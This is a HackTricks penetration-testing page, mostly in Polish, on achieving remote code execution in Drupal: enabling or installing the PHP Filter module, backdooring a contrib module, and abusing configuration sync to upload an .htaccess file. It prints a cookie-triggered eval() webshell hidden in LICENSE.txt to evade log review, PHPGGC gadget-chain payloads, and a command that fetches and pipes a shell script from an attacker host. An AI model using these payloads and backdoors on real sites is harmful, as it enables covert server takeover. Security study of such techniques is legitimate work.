# Drupal RCE

{{#include ../../../banners/hacktricks-training.md}}

## Z modułem PHP Filter

> [!WARNING]
> W starszych wersjach Drupala **(przed wersją 8)** można było zalogować się jako administrator i **włączyć moduł `PHP filter`**, który "Allows embedded PHP code/snippets to be evaluated." Jednak od wersji 8 ten moduł nie jest instalowany domyślnie.

1. Przejdź do **/modules/php** i jeśli zwrócony zostanie błąd 403, to **PHP filter plugin jest zainstalowany i możesz kontynuować**
1. Jeśli nie, przejdź do `Modules` i zaznacz pole `PHP Filter`, a następnie kliknij `Save configuration`
2. Aby to wykorzystać, kliknij `Add content`, następnie wybierz `Basic Page` lub `Article` i wklej **PHP backdoor**, potem wybierz format tekstu `PHP` i na końcu kliknij `Preview`
3. Aby go uruchomić, po prostu odwiedź nowo utworzony node:
```bash
curl http://drupal.local/node/3
```
## Zainstaluj moduł PHP Filter

> [!WARNING]
> W obecnych wersjach nie jest już możliwe instalowanie wtyczek mając dostęp jedynie do webu po domyślnej instalacji.

Od wersji **8 wzwyż,** [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **moduł nie jest instalowany domyślnie**. Aby skorzystać z tej funkcjonalności, musimy **zainstalować moduł samodzielnie**.

1. Pobierz najnowszą wersję modułu ze strony Drupal.
1. `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
2. Po pobraniu przejdź do **`Administration`** > **`Reports`** > **`Available updates`**.
3. Kliknij **`Browse`**, wybierz plik z katalogu, do którego go pobraliśmy, a następnie kliknij **`Install`**.
4. Po zainstalowaniu modułu możemy kliknąć **`Content`** i **utworzyć nową podstawową stronę**, podobnie jak w przykładzie dla Drupal 7. Ponownie upewnij się, że **wybierzesz `PHP code` z rozwijanego menu `Text format`**.

## Moduł z backdoorem

> [!WARNING]
> W obecnych wersjach nie jest już możliwe instalowanie wtyczek mając dostęp jedynie do webu po domyślnej instalacji.

Było możliwe pobranie modułu, dodanie do niego backdoora i zainstalowanie go. Na przykład pobranie [**Trurnstile**](https://www.drupal.org/project/turnstile) modułu w formacie skompresowanym, utworzenie nowego pliku backdoora w PHP wewnątrz niego i umożliwienie dostępu do pliku PHP za pomocą pliku .htaccess:
```html
<IfModule mod_rewrite.c> RewriteEngine On RewriteBase / </IfModule>
```
A następnie przejdź do **`http://drupal.local/admin/modules/install`**, aby zainstalować backdoored module i uzyskać dostęp do **`/modules/turnstile/back.php`**, aby go uruchomić.

## Backdooring Drupal with Configuration synchronization <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Post udostępniony przez** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### Część 1 (aktywacja _Media_ i _Media Library_)

W menu _Extend_ (/admin/modules) możesz aktywować elementy, które wyglądają na już zainstalowane wtyczki. Domyślnie wtyczki _Media_ i _Media Library_ nie są aktywowane, więc włączmy je.

Przed aktywacją:

<figure><img src="../../../images/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Po aktywacji:

<figure><img src="../../../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Część 2 (wykorzystanie funkcji _Configuration synchronization_) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Wykorzystamy funkcję _Configuration synchronization_, aby zrzucić (export) i wgrać (import) wpisy konfiguracji Drupala:

- /admin/config/development/configuration/single/export
- /admin/config/development/configuration/single/import

**Patch pliku system.file.yml**

Zacznijmy od zmodyfikowania pierwszego wpisu `allow_insecure_uploads` z:

File: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Do:

Plik: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../images/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Zastosuj poprawkę w field.field.media.document.field_media_document.yml**

Następnie zaktualizuj drugi wpis `file_extensions` z:

Plik: field.field.media.document.field_media_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../images/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Do:

Plik: field.field.media.document.field_media_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> Nie używam tego w tym wpisie na blogu, ale zauważono, że można zdefiniować wpis `file_directory` w dowolny sposób i że jest on podatny na path traversal attack (dzięki czemu możemy cofnąć się w górę w drzewie systemu plików Drupal).

<figure><img src="../../../images/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Część 3 (wykorzystanie funkcji _Add Document_) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

Ostatni krok jest najprostszy i dzieli się na dwa podetapy. Pierwszy polega na przesłaniu pliku w formacie .htaccess, aby wykorzystać dyrektywy Apache i pozwolić, żeby pliki .txt były interpretowane przez silnik PHP. Drugi polega na przesłaniu pliku .txt zawierającego nasz payload.

Plik: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
Dlaczego ten trik jest fajny?

Ponieważ gdy Webshell (który nazwiemy LICENSE.txt ) zostanie umieszczony na serwerze WWW, możemy przesyłać nasze polecenia przez `$_COOKIE`, a w logach serwera WWW pojawi się to jako legalne żądanie GET do pliku tekstowego.

Dlaczego nazwać nasz Webshell LICENSE.txt?

Po prostu dlatego, że jeśli weźmiemy na przykład następujący plik, [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (który jest już obecny w Drupal core), mamy plik o 339 liniach i rozmiarze 17,6 KB, co czyni go idealnym do dodania w środku małego fragmentu kodu PHP (ponieważ plik jest wystarczająco duży).

<figure><img src="../../../images/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Plik: Patched LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **Part 3.1 (upload file .htaccess)**

First, we leverage the _Add Document_ (/media/add/document) feature to upload our file containing the Apache directives (.htaccess).

<figure><img src="../../../images/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Part 3.2 (upload file LICENSE.txt)**

Then, we leverage the _Add Document_ (/media/add/document) feature again to upload a Webshell hidden within a license file.

<figure><img src="../../../images/image (11) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (12) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (13) (1).png" alt=""><figcaption></figcaption></figure>

### Part 4 (interaction with the Webshell) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

The last part consists of interacting with the Webshell.

As shown in the following screenshot, if the cookie expected by our Webshell is not defined, we get the subsequent result when consulting the file via a Web browser.

<figure><img src="../../../images/image (14) (1).png" alt=""><figcaption></figcaption></figure>

When the attacker sets the cookie, he can interact with the Webshell and execute any commands he wants.

<figure><img src="../../../images/image (15) (1).png" alt=""><figcaption></figcaption></figure>

And as you can see in the logs, it looks like only a txt file has been requested.

<figure><img src="../../../images/image (16) (1).png" alt=""><figcaption></figcaption></figure>

Thank you for taking the time to read this article, I hope it will help you get some shells.

## Drupal core gadget chain (SA-CORE-2024-007 / SA-CORE-2024-008)

Two advisories published **20 Nov 2024** (CVE-2024-55637 & CVE-2024-55638) describe new **PHP object gadget chains in Drupal core** (7.0–7.101, 8.x, 10.2.0–10.2.10, 10.3.0–10.3.8, early 11.x). They are **not directly exploitable** but give attackers a ready-made chain once any contrib/module performs `unserialize()` on user input.

Practical exploitation workflow:

1. **Find the unserialize sink** (contrib module or custom code). Grep codebase for `unserialize(` or `Drupal\Component\Serialization\PhpSerialize::decode`. Target endpoints that accept POST/JSON or configuration imports.
2. **Generate a payload** using the vulnerable class path that matches the gadget chain. After SA-CORE-2024-008, the public chain was added to common payload generators. Example with PHPGGC (commit ≥ Dec 2024):
```bash
./phpggc drupal/rce2 system 'id' > payload.ser
```
3. **Dostarcz zserializowany blob** do sinka (np. parametru, który zostanie zdeserializowany). Dla ciała form-encoded:
```bash
curl -X POST https://target/admin/config/some/module \
-d "serialized_setting=$(cat payload.ser)"
```
4. **Wyzwól destrukcję** (często automatycznie na końcu żądania) i wykonaj polecenie.

Uwagi do testów:

- Gadget działa tylko na wersjach **starszych niż 10.2.11 / 10.3.9 / 7.102** (załatane). Sprawdź wersję celu przez `/core/lib/Drupal.php` lub `CHANGELOG.txt`.
- Sterowniki DB firm trzecich mogą wymagać dodatkowego utwardzenia; szukaj wdrożeń, które pominęły okno aktualizacji bezpieczeństwa.

## Niedawne contrib-module niebezpieczne deserializacje → RCE

Kilka modułów contrib poprawiło niebezpieczne ścieżki używające `unserialize()` pod koniec 2024. Jeśli serwis nie ma tych aktualizacji, dają one exploitable sink wymagany przez core gadget chain:

- **Mailjet** (<4.0.1, CVE-2024-13296): dane kontrolowane przez admina przekazywane do `unserialize()`, umożliwiające **PHP Object Injection → RCE** w połączeniu z core gadgets.
- **Eloqua** (7.x-1.x < 1.15, CVE-2024-13297): podobne niebezpieczne użycie `unserialize()` dostępne dla użytkowników z `access administration pages`.

Pomysł testowy (uwierzytelniony):
```bash
phpggc drupal/rce2 system 'bash -c "curl http://attacker/shell.sh|sh"' > p.ser
curl -b session=ADMINCOOKIE \
-F "import=@p.ser" https://target/admin/config/eloqua/import
```
Jeżeli moduł deserializuje przesłane dane, gadget chain prowadzi do RCE. Połącz z XSS/CSRF, aby ukraść admin cookies i uzyskać pełny łańcuch ataku.

## Źródła

- [Drupal core – gadget chain – SA-CORE-2024-008](https://www.drupal.org/sa-core-2024-008)
- [Mailjet module – arbitrary PHP code execution – SA-CONTRIB-2024-062](https://www.drupal.org/sa-contrib-2024-062)

{{#include ../../../banners/hacktricks-training.md}}
